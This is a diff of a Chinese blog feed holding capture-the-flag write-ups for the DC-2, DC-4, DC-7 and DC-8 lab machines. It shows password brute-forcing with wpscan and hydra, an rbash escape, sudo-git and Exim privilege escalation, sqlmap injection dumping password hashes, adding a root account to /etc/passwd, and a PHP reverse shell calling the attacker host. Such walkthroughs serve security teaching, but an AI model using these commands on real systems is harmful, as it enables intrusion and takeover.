+<blockquote>
+<p>网段 192.168.18.0/24</p>
+<p>kali 192.168.18.131</p>
+<p>靶机 192.168.18.132</p>
+</blockquote>
+<p>扫描网段</p>
+<blockquote>
+<p>sudo nmap -sn 192.168.18.0/24</p>
+<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 10:12 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.132<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds<br>kali@kali2020:~$ </p>
+</blockquote>
+<p>扫描靶机开放的端口</p>
+<blockquote>
+<p>sudo nmap 192.168.18.132 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 11:38 CST<br>Nmap scan report for dc-2 (192.168.18.132)<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+</blockquote>
+<p>开放了80端口和ssh端口，浏览器去访问发现无法访问，直接跳转成了dc2，去修改hosts</p>
+<blockquote>
+<p>sudo vim /etc/hosts</p>
+<p>添加 192.168.18.132 dc-2</p>
+</blockquote>
+<p>再去访问192.168.18.132即可,发现是wordpress</p>
+<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>点击flag 得到flag1，提示使用<code>cewl</code></p>
+<p><img src="/posts/e4e28081/flag1.png"></p>
+<p>用<code>dirb</code>扫一下目录</p>
+<p>扫到一个wp-admin 去访问后会跳转到登录页面 <a href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
+<p>这里也可以用<code>nikto</code></p>
+<p><img src="/posts/e4e28081/nikto1.png"></p>
+<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>使用kali自带的wpscan扫一下<br><code>wpscan --url dc-2 -e u</code></p>
+<p><img src="/posts/e4e28081/wpscan1.png"></p>
+<br>
+
+<p>扫到三个用户名，admin,jerry,tom<br>创建一个list存放这三个用户名</p>
+<br>
+
+<p>根据flag1的提示 使用<code>cewl</code>生成密码字典</p>
+<br>
+
+<blockquote>
+<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#x6f;&#x62;&#x69;&#110;&#x40;&#x64;&#x69;&#103;&#x69;&#x2e;&#110;&#105;&#110;&#106;&#97;">&#x72;&#x6f;&#x62;&#x69;&#110;&#x40;&#x64;&#x69;&#103;&#x69;&#x2e;&#110;&#105;&#110;&#106;&#97;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
+<p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
+</blockquote>
+<p>使用wpscan爆破</p>
+<blockquote>
+<p>kali@kali2020:~/Desktop$ wpscan –url dc-2 -U dc-2users.list  -P dc-2.dic </p>
+<p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
+</blockquote>
+<p><img src="/posts/e4e28081/wpscan2.png"></p>
+<p>使用tom 成功登录，发现有篇名为hello-word的文章进去看看</p>
+<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2<br><img src="/posts/e4e28081/flag2.png"><br><img src="/posts/e4e28081/flag12.png"><br>flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
+<p>使用hydra爆破ssh</p>
+<blockquote>
+<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
+<p> 得到账号密码</p>
+<p>[7744][ssh] host: 192.168.18.132   login: tom   password: parturient</p>
+</blockquote>
+<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>使用ssh登录<br><code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code><br>登录后<code>ls</code>后发现存在flag3.txt</p>
+<p>使用<code>cat flag3.txt</code></p>
+<blockquote>
+<p>-rbash: sudo: command not found</p>
+</blockquote>
+<p><img src="/posts/e4e28081/rbashnotfound.png"></p>
+<p><strong>-rbash绕过</strong><br>解决方案 <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a </span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/e4e28081/flag3.png"></p>
+<p>得到flag3</p>
+<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>根据flag3提示，使用<code>su</code>切换到jerry用户下<br><code>cat /etc/passwd </code>发现Jerry用户<br>输入之前爆破出来的密码成功登录Jerry用户</p>
+<blockquote>
+<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
+</blockquote>
+<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>查看sudo 支持的免密命令</p>
+<blockquote>
+<p>sudo -l</p>
+<p>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git</p>
+</blockquote>
+<p>根据上一个提示 这里的git命令推测可以使用</p>
+<p>考虑git提权 <a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
+<blockquote>
+<p>sudo git -p –help</p>
+</blockquote>
+<p><img src="/posts/e4e28081/git1.png"><br><img src="/posts/e4e28081/git2.png"><br><img src="/posts/e4e28081/git3.png"><br><img src="/posts/e4e28081/finalflag.png"></p>
+<p><strong>总结</strong></p>
+<ul>
+<li> rbash绕过</li>
+<li> git提权</li>
+</ul>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DCchallenges4</title>
     <url>/posts/d8125b4/</url>
     <content><![CDATA[<ul>
@@ -412,8 +412,8 @@
 <p>得到 <code>jim  jibril04</code></p>
 <p>连接ssh</p>
 <blockquote>
-<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#x69;&#x6d;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x38;&#x2e;&#49;&#51;&#53;">&#106;&#x69;&#x6d;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x38;&#x2e;&#49;&#51;&#53;</a></strong></p>
-<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#105;&#109;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#x38;&#x2e;&#49;&#x33;&#53;">&#106;&#105;&#109;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#x38;&#x2e;&#49;&#x33;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#105;&#x6d;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#53;">&#106;&#105;&#x6d;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#53;</a></strong></p>
+<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x6a;&#x69;&#x6d;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#56;&#46;&#x31;&#51;&#x35;">&#x6a;&#x69;&#x6d;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#56;&#46;&#x31;&#51;&#x35;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
 <p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
 <p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
 <p><strong>jim@dc-4:~$ pwd</strong></p>
@@ -461,7 +461,7 @@
 <p>Mamor:x:0:0:::/bin/bash</p>
 <p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
 <blockquote>
-<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#x61;&#109;&#111;&#114;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#49;&#x38;&#x2e;&#x31;&#x33;&#x35;">&#77;&#x61;&#109;&#111;&#114;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#49;&#x38;&#x2e;&#x31;&#x33;&#x35;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#x61;&#x6d;&#111;&#x72;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x31;&#56;&#x2e;&#x31;&#51;&#x35;">&#77;&#x61;&#x6d;&#111;&#x72;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x31;&#56;&#x2e;&#x31;&#51;&#x35;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#x4d;&#97;&#109;&#111;&#114;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;">&#x4d;&#97;&#109;&#111;&#114;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;</a>‘s password: </p>
+<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#x61;&#x6d;&#x6f;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;">&#77;&#x61;&#x6d;&#x6f;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x4d;&#97;&#109;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#56;&#x2e;&#49;&#51;&#53;">&#x4d;&#97;&#109;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#56;&#x2e;&#49;&#51;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#x61;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#56;&#x2e;&#x31;&#x33;&#x35;">&#77;&#x61;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#56;&#x2e;&#x31;&#x33;&#x35;</a>‘s password: </p>
 <p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
 </blockquote>
 <p>构造失败，重新构造一个</p>
@@ -789,106 +789,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DCchallenges8</title>
-    <url>/posts/437699f/</url>
-    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
-<p>网段     192.168.18.0/24</p>
-<p>kali        192.168.18.131</p>
-<p>靶机        192.168.18.141</p>
-</blockquote>
-<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
-</blockquote>
-<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
-</blockquote>
-<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
-<p>sudo python3 dirsearch -u 192.168.18.141</p>
-</blockquote>
-<p>没扫到什么东西，换dirb扫到了</p>
-<p><code>http://192.168.18.141/user</code></p>
-<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>进入主页,点左侧的Details下的链接，发现url处有个nid的参数，看看这里是否存在sql注入</p>
-<p>sqlmap跑一下</p>
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
-<blockquote>
-<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
-</blockquote>
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
-<blockquote>
-<p> Database: d7db<br>[88 tables]<br>+—————————–+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+—————————–+</p>
-</blockquote>
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
-<blockquote>
-<p> Database: d7db<br>Table: users<br>[16 columns]<br>+——————+——————+<br>| Column           | Type             |<br>+——————+——————+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
-</blockquote>
-<br>
-
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
-<blockquote>
-<p>Database: d7db<br>Table: users<br>[2 entries]<br>+——-+———————————————————+<br>| name  | pass                                                    |<br>+——-+———————————————————+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+——-+———————————————————+</p>
-</blockquote>
-<p>跑出来两条数据 ，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
-<br>
-
-<p><code>admin</code> 使用john没跑出来</p>
-<p><code>john</code> 密码为<code>turtle</code></p>
-<p><code>http://192.168.18.141/user/</code>登录成功</p>
-<p>打开content看看</p>
-<p><img src="/posts/437699f/content.png"></p>
-<br>
-
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>contact us页面可以编辑</p>
-<p>修改成php格式</p>
-<p><img src="/posts/437699f/ncshell.png"></p>
-<p><img src="/posts/437699f/submit.png"></p>
-<p>反弹交互shell</p>
-<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p><img src="/posts/437699f/python_shell.png"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看具有root权限的命令</p>
-<p><img src="/posts/437699f/find.png"></p>
-<p>试着利用下exim4</p>
-<p>查看exim4版本</p>
-<p><code>exim4 --version</code></p>
-<blockquote>
-<p>Exim version 4.89 </p>
-</blockquote>
-<p><code>searchsploit  exim 4</code></p>
-<p>找下exp，选择46996.sh,拷贝到本地，并开启kali的http服务</p>
-<blockquote>
-<p>cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh</p>
-<p>python2 -m SimpleHTTPServer</p>
-</blockquote>
-<p>在靶机上下载kali的shell,先回到/tmp 目录下</p>
-<blockquote>
-<p>wget <a href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
-</blockquote>
-<p>注意:直接把exp下载过去是无法使用的，<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
-<blockquote>
-<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
-</blockquote>
-<p>看下提示用法</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 &#x2F;tmp&#x2F;pwned</span><br><span class="line"># # id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/437699f/flag.png"></p>
-<br>
-
-<br>
-
-<blockquote>
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
-<p><a href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>DCchallenges</category>
-      </categories>
-      <tags>
-        <tag>DCchallenges</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DCchallenges7</title>
     <url>/posts/9488740e/</url>
     <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
@@ -1007,6 +907,106 @@
 <p><img src="/posts/9488740e/flag.png"></p>
 <blockquote>
 <p>注:其实可以在写一句话的时候可以直接写反弹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="/posts/9488740e/ncshell.png"></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DCchallenges8</title>
+    <url>/posts/437699f/</url>
+    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
+<p>网段     192.168.18.0/24</p>
+<p>kali        192.168.18.131</p>
+<p>靶机        192.168.18.141</p>
+</blockquote>
+<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
+</blockquote>
+<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
+</blockquote>
+<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
+<p>sudo python3 dirsearch -u 192.168.18.141</p>
+</blockquote>
+<p>没扫到什么东西，换dirb扫到了</p>
+<p><code>http://192.168.18.141/user</code></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>进入主页,点左侧的Details下的链接，发现url处有个nid的参数，看看这里是否存在sql注入</p>
+<p>sqlmap跑一下</p>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
+<blockquote>
+<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
+</blockquote>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
+<blockquote>
+<p> Database: d7db<br>[88 tables]<br>+—————————–+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| 